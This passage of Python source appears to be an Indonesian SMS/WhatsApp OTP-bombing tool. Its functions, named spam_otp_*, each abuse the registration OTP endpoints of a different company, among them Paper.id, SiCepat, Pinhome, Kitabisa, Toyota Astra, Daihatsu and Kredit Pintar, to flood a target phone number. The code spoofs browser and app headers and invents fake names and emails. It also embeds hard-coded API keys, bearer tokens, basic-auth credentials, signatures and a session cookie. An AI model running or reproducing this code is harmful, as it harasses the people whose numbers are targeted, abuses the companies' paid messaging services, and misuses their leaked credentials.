        ua = "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        pua = "Jupiter/7.10.13 mobile_web (linux) Chrome 146"

        user = ''.join(random.choices(string.ascii_lowercase, k=8))
        email = f"{user}@gmail.com"
        fprint = "A20dt" + spam_otp_codex(15)
        reqid = spam_otp_codex(52)

        session.post(
            "https://mail.paper.id/api/validate-mail",
            json={"email": email},
            headers={"request-id": reqid, "user-agent": ua, "content-type": "application/json"},
            timeout=10
        )

        session.post(
            "https://api.paper.id/api/v1/auth/login/check",
            json={"fingerprint": fprint, "email": email},
            headers={"request-id": reqid, "user-agent": ua, "content-type": "application/json"},
            timeout=10
        )

        session.post(
            "https://api.paper.id/api/v1/auth/fingerprints/check",
            json={"action": "register", "email": email, "phone": nomor_format, "fingerprint": fprint},
            headers={"request-id": reqid, "user-agent": ua, "x-paper-user-agent": pua, "content-type": "application/json"},
            timeout=10
        )

        resp = session.post(
            "https://register.paper.id/api/v1/auth/register/send-otp",
            json={"phone": nomor_format, "method": "whatsapp", "registered_by": "web"},
            headers={
                "request-id": reqid,
                "user-agent": ua,
                "x-paper-user-agent": pua,
                "content-type": "application/json",
                "origin": "https://www.paper.id",
                "referer": "https://www.paper.id/"
            },
            timeout=10
        )

        return resp.status_code == 200

    except:
        return False
        
def spam_otp_absenku(nomor, captcha="", session=None):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        if session is None:
            session = requests.Session()
            session.get(
                "https://registrasi.absenku.com/index.php/register/index/2",
                headers={
                    "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                },
                timeout=10
            )
            session.get(
                "https://registrasi.absenku.com/index.php/register/captcha",
                headers={
                    "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                    "referer": "https://registrasi.absenku.com/index.php/register/index/2",
                },
                timeout=10
            )

        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "referer": "https://registrasi.absenku.com/index.php/register/index/2",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        post_resp = session.post(
            "https://registrasi.absenku.com/index.php/register/validasi_trial",
            data={
                "nama": "Nama Lengkap",
                "email": "email@gmail.com",
                "telp": nomor,
                "company_name": "PT Test",
                "jumlah": "10",
                "tujuan": "1",
                "paket": "21",
                "captcha": captcha,
                "ci_csrf_token": ""
            },
            headers=headers,
            timeout=10
        )

        result = post_resp.json()
        if result.get("captcha_error"):
            return False

        resp = session.get(
            "https://registrasi.absenku.com/index.php/register/ajax_detik_otp",
            params={"telp": nomor},
            headers=headers,
            timeout=10
        )

        return resp.text.strip() == "120"
    except:
        return False
        
def spam_otp_sicepat(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        apikey = "67b98547-6cf7-4f05-9c1b-be597fca892f"
        url = f"https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/{nomor_lokal}?sms=true"

        headers = {
            "Host": "api.sicepatconsumer.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "x-api-key": apikey,
            "Origin": "https://dashboard.sicepat.com",
            "Referer": "https://dashboard.sicepat.com/",
            "sec-ch-ua-platform": "Android"
        }

        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code == 200

    except:
        return False
        
def spam_otp_uku(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        imei = ''.join(random.choices('abcdef0123456789', k=32))

        url = "https://gateway.ukuindo.com/entrance/v3/getcode"

        headers = {
            "Host": "gateway.ukuindo.com",
            "Accept": "application/json",
            "Appsflyerid": "1739206918799-3547019681597550358",
            "Device": "ANDROID",
            "Distinctid": "undefined",
            "Imei": imei,
            "Version": "6092201",
            "Versioncode": "6.9.22",
            "Accept-Language": "id_ID",
            "Adid": "",
            "Channel": "GooglePlay",
            "Product": "uku",
            "Content-Type": "application/json",
            "User-Agent": "okhttp/4.9.2"
        }

        payload = {
            "phone": nomor_lokal,
            "smsType": "VOICE_SMS",
            "channel": "GooglePlay",
            "appInstanceId": ""
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

    except:
        return False
        
def spam_otp_pinhome(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        url = "https://www.pinhome.id/api/pinaccount/request/otp"

        headers = {
            "Host": "www.pinhome.id",
            "Accept": "application/json",
            "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
            "Origin": "https://www.pinhome.id"
        }

        payload = {
            "accountType": "customers",
            "countryCode": "62",
            "medium": "whatsapp",
            "otpType": "register",
            "phoneNumber": nomor_lokal
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except:
        return False
        
def spam_otp_adiraku(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"

        headers = {
            "Content-Type": "application/json; charset=utf-8"
        }

        payload = {
            "mobileNumber": nomor_lokal,
            "type": "prospect-create",
            "channel": "whatsapp"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '{"message":"', '","') == "success"

    except:
        return False
        
def spam_otp_iskconmumbai(nomor):
    try:
        if nomor.startswith("0"):
            nomor = "62" + nomor[1:]

        session = requests.Session()

        url = "https://www.iskconmumbai.com/api/send_otp"

        headers = {
            "Host": "www.iskconmumbai.com",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "Referer": "https://www.iskconmumbai.com/web/signup",
            "Cookie": "frontend_lang=en_US; session_id=a06efb92ff6b53383e6136b42413bc5cc1af2fc0",
        }

        payload = {
            "id": 7,
            "jsonrpc": "2.0",
            "method": "call",
            "params": {
                "signup": True,
                "mobile": nomor
            }
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False
        
def spam_otp_jogjakita(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        auth_resp = session.post(
            "https://aci-user.bmsecure.id/oauth/token",
            data={
                "grant_type": "client_credentials",
                "uuid": "00000000-0000-0000-0000-000000000000",
                "id_user": "0",
                "id_kota": "0",
                "location": "0.0,0.0",
                "via": "jogjakita_user",
                "version_code": "501",
                "version_name": "6.10.1"
            },
            headers={
                "authorization": "Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "okhttp/4.10.0"
            },
            timeout=10
        )

        token = auth_resp.json().get("access_token")
        if not token:
            return False

        resp = session.post(
            "https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send",
            json={
                "phone_user": nomor,
                "primary_credential": {
                    "device_id": "",
                    "fcm_token": "",
                    "id_kota": 0,
                    "id_user": 0,
                    "location": "0.0,0.0",
                    "uuid": "",
                    "version_code": "501",
                    "version_name": "6.10.1",
                    "via": "jogjakita_user"
                },
                "uuid": "00000000-4c22-250d-3006-9a465f072739",
                "version_code": "501",
                "version_name": "6.10.1",
                "via": "jogjakita_user"
            },
            headers={
                "Content-Type": "application/json; charset=UTF-8",
                "Authorization": f"Bearer {token}"
            },
            timeout=10
        )

        result = resp.json()
        return result.get("rc") == 200
    except:
        return False
        
def spam_otp_bliblitiket(nomor):
    try:
        if nomor.startswith("0"):
            nomor = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor = "+" + nomor
        elif not nomor.startswith("+62"):
            nomor = "+62" + nomor

        session = requests.Session()

        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "x-channel-id": "MWEB",
            "x-client-id": "3ca1ed67701249861819ba4850f4f135",
            "x-entity": "BLIBLI",
            "x-lang": "id",
            "x-request-id": spam_otp_codex(36),
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        # Step 1 - Ambil cookie
        session.get(
            "https://account.bliblitiket.com/register",
            headers={"user-agent": headers["user-agent"]},
            timeout=10
        )

        # Step 2 - Cek status nomor
        nomor_encoded = nomor.replace("+", "%2B")
        session.get(
            f"https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/registration/status?identity={nomor_encoded}&doMigration=false",
            headers=headers,
            timeout=10
        )

        # Step 3 - Kirim OTP
        headers["content-type"] = "text/plain;charset=UTF-8"
        headers["origin"] = "https://account.bliblitiket.com"
        headers["referer"] = "https://account.bliblitiket.com/register"
        headers["x-request-id"] = spam_otp_codex(36)

        resp = session.post(
            "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate",
            data='{"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":"' + nomor + '","recaptchaToken":""}',
            headers=headers,
            timeout=10
        )

        return spam_otp_nilai(resp.text, '"code":"', '"') == "SUCCESS"
    except:
        return False
        
def spam_otp_yogyaonline(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        session = requests.Session()

        session.get(
            "https://www.yogyaonline.co.id/register",
            headers={
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
            },
            timeout=10
        )

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.yogyaonline.co.id",
            "referer": "https://www.yogyaonline.co.id/register",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }

        resp = session.post(
            "https://www.yogyaonline.co.id/api/v1/send-otp",
            json={"phone_number": nomor_lokal},
            headers=headers,
            timeout=10
        )

        return resp.status_code == 200

    except:
        return False
        
def spam_otp_kitabisa_wa(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()
        url = "https://gate.kitabisa.com/wong/register/draft"

        headers = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://accounts.kitabisa.com",
            "referer": "https://accounts.kitabisa.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "version": "3.4.0",
            "x-ktbs-api-version": "1.0.0",
            "x-ktbs-client-name": "kanvas",
            "x-ktbs-client-version": "1.0.0",
            "x-ktbs-platform-name": "kanvas",
            "x-ktbs-request-id": str(uuid.uuid4()),
            "x-ktbs-signature": "2a6a2debbd423ac545c8237f0c75a6ebbed604367dc94cff15791a58cbadc7e5",
            "x-ktbs-time": str(int(time.time())),
        }

        payload = {
            "full_name": "Amirudin Husaeni",
            "username": nomor,
            "otp_type": "whatsapp"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False


def spam_otp_kitabisa_sms(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()
        url = "https://gate.kitabisa.com/wong/register/draft"

        headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://accounts.kitabisa.com",
            "referer": "https://accounts.kitabisa.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "version": "3.4.0",
            "x-ktbs-api-version": "1.0.0",
            "x-ktbs-client-name": "kanvas",
            "x-ktbs-client-version": "1.0.0",
            "x-ktbs-platform-name": "kanvas",
            "x-ktbs-request-id": str(uuid.uuid4()),
            # Ganti dengan signature dari curl manual yang berhasil
            "x-ktbs-signature": "2a6a2debbd423ac545c8237f0c75a6ebbed604367dc94cff15791a58cbadc7e5",
            "x-ktbs-time": str(int(time.time())),
        }

        payload = {
            "full_name": "Amirudin Husaeni",
            "username": nomor,
            "otp_type": "sms"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10, verify=False)
        return resp.status_code < 400
    except:
        return False
        
def spam_otp_saturdays(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"

        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "authorization": "undefined",
            "content-type": "application/json",
            "country-code": "ID",
            "currency-code": "IDR",
            "device-type": "mweb",
            "origin": "https://saturdays.com",
            "referer": "https://saturdays.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "platform": "mweb",
            "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"
        }

        payload = {
            "number": nomor_lokal,
            "country_code": "+62",
            "type": ""
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

    except:
        return False
        
def spam_otp_babamarket(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        url = "https://dev.babamarket.co.id/v2/auth/otp/request"

        timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")

        headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://babamarket.co.id",
            "referer": "https://babamarket.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-baba-signature": "19c5b3de32937d5d917ec51f0206bc83ed3b1e63b707d96f3153cf7f15d4132f",
            "x-baba-timestamp": timestamp
        }

        payload = {
            "type": "phone",
            "phone": nomor_lokal,
            "is_register": True
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

    except:
        return False
        
def spam_otp_bantusaku(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        unique_code = str(uuid.uuid4())

        url = "https://m.bantusaku.id/api/user/send-sms"

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://m.bantusaku.id",
            "referer": "https://m.bantusaku.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-auth-token": "null",
            "x-device-os": "web",
            "x-merchant": "BantuSaku",
            "x-token-sign": unique_code,
            "x-version": "web-3.2.1"
        }

        payload = {
            "phone": nomor_lokal,
            "type": "register",
            "imageCode": "",
            "merchantNo": "BantuSaku",
            "uniquCode": unique_code
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

    except:
        return False
        
def spam_otp_mengantar(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        nama = f"{random.choice(first)} {random.choice(last)}"
        email = f"{nama.lower().replace(' ', '')}{random.randint(10,99)}@gmail.com"

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://app.mengantar.com",
            "referer": "https://app.mengantar.com/id/register",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }

        payload = {
            "courier": "JNE",
            "email": email,
            "language": "id",
            "name": nama,
            "phone": nomor,
            "subject": "register",
            "verificationType": "whatsapp"
        }

        resp = session.post(
            "https://app.mengantar.com/api/auth/send-verification-code",
            json=payload,
            headers=headers,
            timeout=10
        )
        return resp.status_code < 400
    except:
        return False
        
def spam_otp_toyota(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        nama = f"{random.choice(first)} {random.choice(last)}"
        email = f"{nama.lower().replace(' ', '')}{random.randint(10,99)}@gmail.com"

        token_resp = session.post(
            "https://data-web.tam-icm.com/api/public/vendors/tokenize",
            json={"data": [nomor, nama, email]},
            headers={
                "Authorization": "Basic ZGlkeDpUb3lvdGEyMDI0",
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Origin": "https://www.toyota.astra.co.id",
                "Referer": "https://www.toyota.astra.co.id/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
            },
            timeout=10
        )

        token_data = token_resp.json()
        if not token_data or token_data[0].get("status") != "Succeed":
            return False

        phone_token = token_data[0].get("token")
        if not phone_token:
            return False

        resp = session.post(
            "https://dxmi.toyota.astra.co.id/api/auth/one-account/register/tmp",
            json={"phoneNumber": phone_token},
            headers={
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "origin": "https://www.toyota.astra.co.id",
                "referer": "https://www.toyota.astra.co.id/",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                'sec-ch-ua-platform': '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site"
            },
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False
        
def spam_otp_volta(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://voltaindonesia.com",
            "referer": "https://voltaindonesia.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        resp = session.post(
            "https://auth-production.voltaindonesia.com/v1/client/request-otp",
            json={"phoneNumber": nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False
       
def spam_otp_kreditpintar(nomor):
    try:
        if nomor.startswith("0"):
            nomor = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor = "+" + nomor
        elif not nomor.startswith("+62"):
            nomor = "+62" + nomor

        uuid_val = str(__import__('uuid').uuid4())

        session = requests.Session()

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id",
            "content-type": "application/json",
            "origin": "https://go.kreditpintar.com",
            "referer": f"https://go.kreditpintar.com/OFFICIAL2021/code-step?m={nomor}",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-adv-market-channel": "OfficialWebsite",
            "x-adv-uuid": uuid_val,
            "x-app-version": "APPVERSION_NAME(9999)",
            "x-os-type": "WEB",
            "x-user-agent": f"Pintar-ID-Cash (WebAndroid;;;id) uuid/{uuid_val} version/0.1.0"
        }

        resp = session.post(
            "https://go.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id",
            json={"mobileNumber": nomor, "type": "SMS"},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False

def spam_otp_bunda(nomor):
    try:
        if nomor.startswith("0"):
            nomor = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            nomor = nomor[1:]

        session = requests.Session()

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://www.bunda.co.id",
            "referer": "https://www.bunda.co.id/id",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-locale": "id"
        }

        resp = session.post(
            "https://cms.bunda.co.id/api/v1/auth/send-otp",
            json={"phone_number": int(nomor), "type": "auth"},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False
        
def spam_otp_daihatsu(nomor):
    try:
        if nomor.startswith("0"):
            nomor = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            nomor = nomor[1:]

        session = requests.Session()

        # Step 1 - Ambil cookie + CSRF token
        resp_page = session.get(
            "https://www.astra-daihatsu.id/register",
            headers={
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
            },
            timeout=10
        )

        csrf = ""
        for line in resp_page.text.splitlines():
            if "CSRFToken" in line and "value=" in line:
                csrf = line.split('value="')[1].split('"')[0]
                break

        if not csrf:
            return False

        # Step 2 - Kirim OTP
        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/json; charset=UTF-8",
            "csrftoken": csrf,
            "origin": "https://www.astra-daihatsu.id",
            "referer": "https://www.astra-daihatsu.id/register",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }

        resp = session.post(
            "https://www.astra-daihatsu.id/otp/whatsapp/generate",
            json={"phoneNo": nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False
        
def spam_otp_topsell(nomor):
    try:
        if nomor.startswith("0"):
            nomor = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            nomor = nomor[1:]

        session = requests.Session()

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://store.topsellbelanja.com",
            "referer": "https://store.topsellbelanja.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        resp = session.post(
            "https://store.topsellbelanja.com/api/proxy/api/v1/users/login",
            json={"phoneNumber": nomor, "website": ""},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False
        
def spam_otp_maulagi(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://maulagi.id",
            "referer": "https://maulagi.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-ml-key": "E32VCHXX32"
        }

        resp = session.post(
            "https://api.maulagi.id/api/v2/auth/check",
            json={"credentials": nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False
        
def spam_otp_pluang(nomor):
    try:
        if nomor.startswith("0"):
            nomor = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor = "+" + nomor
        elif not nomor.startswith("+62"):
            nomor = "+62" + nomor

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
